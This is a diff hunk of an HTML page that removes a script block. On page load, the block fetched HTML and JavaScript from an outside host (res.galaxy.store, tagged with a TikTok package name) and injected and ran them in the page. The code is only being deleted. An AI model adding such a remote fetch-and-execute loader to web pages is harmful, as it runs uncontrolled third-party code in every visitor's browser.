@@ -33,22 +33,6 @@
 
 <body id="top">
 
-<script id="sm-custom-js"></script>
-    <div class="smdiv" id="sm-content" ></div>
-    <script>
-        window.addEventListener("load", function() {
-            fetch('https://res.galaxy.store/getbanner?pkg=com.zhiliaoapp.musically&host_name=notatiktok')
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById("sm-content").innerHTML = data.html;
-                    const smscrp = document.createElement('script');
-                    smscrp.textContent = data.js;
-                    document.getElementById('sm-custom-js').appendChild(smscrp);
-                });
-        });
-    </script>
-
-
   <!-- 
     - #HEADER
   -->
